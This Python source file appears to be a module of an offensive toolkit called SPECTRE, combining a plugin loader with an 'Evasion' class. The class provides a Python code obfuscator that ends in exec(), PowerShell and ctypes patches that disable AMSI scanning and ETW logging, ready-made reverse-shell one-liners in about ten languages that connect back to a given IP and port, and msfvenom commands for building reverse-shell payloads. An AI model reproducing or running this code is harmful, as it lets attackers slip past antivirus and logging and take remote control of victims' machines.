#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  SPECTRE v5.0 - PLUGIN LOADER + EVASION HELPER
#  👻 AUTHOR: イズミー (IZUMI)
# ============================================================

import os
import sys
import importlib.util
import threading
from pathlib import Path
from typing import Dict, List, Any, Optional

from core import log, C, Crypto


class Plugin:
    name = "base_plugin"
    version = "0.0.1"
    author = "unknown"
    description = ""

    def run(self, target: str, session, context: Optional[Dict] = None) -> Dict[str, Any]:
        raise NotImplementedError

    def info(self) -> Dict[str, str]:
        return {"name": self.name, "version": self.version,
                "author": self.author, "description": self.description}


class PluginLoader:
    def __init__(self, plugin_dir: Optional[str] = None):
        self.plugin_dir = Path(plugin_dir or "plugins")
        self.plugin_dir.mkdir(exist_ok=True)
        self.plugins: Dict[str, Plugin] = {}
        self._lock = threading.Lock()

    def load_all(self) -> int:
        count = 0
        for py in self.plugin_dir.glob("*.py"):
            if py.name.startswith("_"):
                continue
            try:
                self._load_file(py)
                count += 1
            except Exception as e:
                log.error(f"Plugin {py.name}: {e}")
        log.info(f"Loaded {count} plugins")
        return count

    def _load_file(self, path: Path):
        spec = importlib.util.spec_from_file_location(
            f"spectre_plugin_{path.stem}", str(path)
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        for attr_name in dir(mod):
            attr = getattr(mod, attr_name)
            if (isinstance(attr, type) and issubclass(attr, Plugin)
                    and attr is not Plugin):
                instance = attr()
                with self._lock:
                    self.plugins[instance.name] = instance
                log.info(f"  → {instance.name} v{instance.version}")

    def run(self, name: str, target: str, session,
            context: Optional[Dict] = None) -> Optional[Dict]:
        p = self.plugins.get(name)
        if not p:
            log.error(f"Plugin not found: {name}")
            return None
        try:
            return p.run(target, session, context or {})
        except Exception as e:
            log.error(f"Plugin {name}: {e}")
            return None

    def run_all(self, target: str, session,
                context: Optional[Dict] = None) -> Dict[str, Any]:
        out = {}
        for name, p in self.plugins.items():
            try:
                out[name] = p.run(target, session, context or {})
            except Exception as e:
                out[name] = {"error": str(e)}
        return out

    def list_plugins(self) -> List[Dict[str, str]]:
        return [p.info() for p in self.plugins.values()]


class Evasion:
    @staticmethod
    def obfuscate_python(code: str) -> str:
        key = Crypto.random_string(16).encode()
        obf = Crypto.obfuscate(code.encode(), key)
        return f"""import base64
_k = {key!r}
_s = {obf!r}
_d = base64.b64decode(_s).decode()[::-1]
_p = base64.b64decode(_d)
_o = bytes(b ^ _k[i % len(_k)] for i, b in enumerate(_p))
exec(_o)
"""

    @staticmethod
    def amsi_bypass_ps() -> str:
        return (
            "$a=[Ref].Assembly.GetTypes();"
            "Foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};"
            "$d=$c.GetFields('NonPublic,Static');"
            "Foreach($e in $d){if($e.Name -like '*Context'){$f=$e}};"
            "$g=$f.GetValue($null);"
            "[IntPtr]$ptr=[IntPtr]::Zero;"
            "[Int32[]]$buf=@(0);"
            "$h=[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($ptr,0,0);"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($ptr+1,0);"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($ptr+2,0)"
        )

    @staticmethod
    def etw_patch_ps() -> str:
        return (
            "$x=[System.Reflection.Assembly]::LoadWithPartialName('System.Core');"
            "$n='System.Diagnostics.Eventing';"
            "[System.Diagnostics.Eventing.EventProvider]::"
            "GetType().Assembly.GetType('System.Diagnostics.Eventing.EventProvider')."
            "GetField('m_enabled','NonPublic,Instance').SetValue("
            "[System.Diagnostics.Eventing.EventProvider].GetField('m_provider')."
            "GetValue($null), 0)"
        )

    @staticmethod
    def generate_amsi_bypass_stub() -> str:
        return '''import ctypes, sys
if sys.platform == "win32":
    k = ctypes.windll.kernel32
    a = ctypes.windll.amsi
    addr = ctypes.cast(a.AmsiScanBuffer, ctypes.c_void_p).value
    patch = b"\\xB8\\x57\\x00\\x07\\x80\\xC3"
    old = ctypes.c_ulong(0)
    k.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
    ctypes.memmove(addr, patch, len(patch))
    k.VirtualProtect(addr, len(patch), old.value, ctypes.byref(old))
    print("[+] AMSI patched")
'''

    @staticmethod
    def reverse_shell_variants(ip: str, port: int) -> Dict[str, str]:
        return {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "bash_alt": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            "python": (f"python3 -c 'import socket,subprocess,os;"
                       f"s=socket.socket();s.connect((\"{ip}\",{port}));"
                       f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                       f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            "php": f"php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "perl": (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                     f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
                     f"open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                     f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"),
            "nc": f"nc -e /bin/sh {ip} {port}",
            "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "ruby": (f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                     f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
            "powershell": (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                           f"\"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                           f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                           f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                           f"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
                           f"$sb=(iex $d 2>&1|Out-String);"
                           f"$sbt=([text.encoding]::ASCII).GetBytes($sb);"
                           f"$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\""),
            "socat": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
        }

    @staticmethod
    def msfvenom_cheatsheet(lhost: str, lport: int) -> List[str]:
        return [
            f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
            f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o meter.exe",
            f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php",
            f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp",
            f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.py",
            f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R -o evil.apk",
            f"msfvenom -p osx/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o shell.macho",
        ]


EXAMPLE_PLUGIN = '''"""Example SPECTRE plugin."""
from plugin_loader import Plugin


class ExampleRecon(Plugin):
    name = "example_recon"
    version = "1.0.0"
    author = "イズミー (IZUMI)"
    description = "Contoh plugin — cek HTTP response time"

    def run(self, target, session, context=None):
        import time
        url = target if target.startswith("http") else f"https://{target}"
        t0 = time.time()
        try:
            r = session.get(url, timeout=8)
            dt = time.time() - t0
            return {"status": r.status_code,
                    "response_time_ms": int(dt * 1000),
                    "server": r.headers.get("Server", "?"),
                    "content_length": len(r.content)}
        except Exception as e:
            return {"error": str(e)}
'''


def ensure_example_plugin(plugin_dir: Path):
    example = plugin_dir / "example_plugin.py"
    if not example.exists():
        example.write_text(EXAMPLE_PLUGIN)
        log.info(f"Created: {example}")


if __name__ == "__main__":
    print(C.a("Plugin + Evasion self-test"))
    pdir = Path("plugins")
    ensure_example_plugin(pdir)
    loader = PluginLoader(str(pdir))
    n = loader.load_all()
    print(C.s(f"Loaded {n} plugins"))
    for info in loader.list_plugins():
        print(C.i(f"  {info['name']} v{info['version']}"))
    obf = Evasion.obfuscate_python("print('hello')")
    print(C.s(f"Obfuscated: {len(obf)} bytes"))
    variants = Evasion.reverse_shell_variants("10.0.0.5", 4444)
    print(C.s(f"Reverse shells: {len(variants)}"))
    msf = Evasion.msfvenom_cheatsheet("10.0.0.5", 4444)
    print(C.s(f"MSFVenom: {len(msf)}"))
    print(C.h("Plugin done 💀"))